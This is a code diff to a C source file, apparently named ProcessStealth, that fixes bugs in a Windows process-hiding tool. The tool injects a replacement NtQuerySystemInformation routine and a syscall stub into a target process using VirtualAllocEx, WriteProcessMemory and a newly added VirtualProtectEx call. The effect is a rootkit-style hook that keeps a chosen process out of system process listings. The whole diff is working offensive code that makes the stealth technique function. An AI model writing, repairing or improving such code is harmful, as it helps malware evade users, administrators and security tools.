@@ -1,6 +1,7 @@
 #include "ProcessStealth.h"
 
 NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+DWORD SearchOverwriteOffset(PVOID Address);
 int AtherFunc();
 
 DWORD GetProcessIdByImageName(wchar_t *ProcessName)
@@ -16,7 +17,7 @@ DWORD GetProcessIdByImageName(wchar_t *ProcessName)
             continue;
         }
 
-        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RELEASE, PAGE_READWRITE);
+        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
         if (spi == NULL)
         {
@@ -54,7 +55,7 @@ DWORD GetProcessIdByImageName(wchar_t *ProcessName)
     return PID;
 }
 
-BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
+BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 {
     BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05};
 
@@ -71,7 +72,7 @@ BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
         return FALSE;
     }
 
-    PVOID NewFunction = VirtualAllocEx(hProcess, NULL, NewNtQuerySystemInformation_Size, MEM_COMMIT | MEM_RELEASE, PAGE_EXECUTE_READWRITE);
+    PVOID NewFunction = VirtualAllocEx(hProcess, NULL, NewNtQuerySystemInformation_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     if (NewFunction == NULL)
     {
@@ -113,16 +114,25 @@ BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
         return FALSE;
     }
 
-    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwrite(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
+    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
-    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwrite(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
+    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    DWORD OldProtect;
+
+    if (VirtualProtectEx(hProcess, NtQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &OldProtect) == FALSE)
+    {
+        printf("[-] VirtualProtectEx Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
@@ -140,7 +150,7 @@ DWORD SearchOverwriteOffset(PVOID Address)
     ULONGLONG Pointer_Overwrite = 0xCCCCCCCCCCCCCCCC;
     for (int i = 0;; i++)
     {
-        if (memcmp((ULONGLONG)Address + i, Pointer_Overwrite, 8) == 0)
+        if (memcmp((ULONGLONG)Address + i, &Pointer_Overwrite, 8) == 0)
         {
             return i;
         }
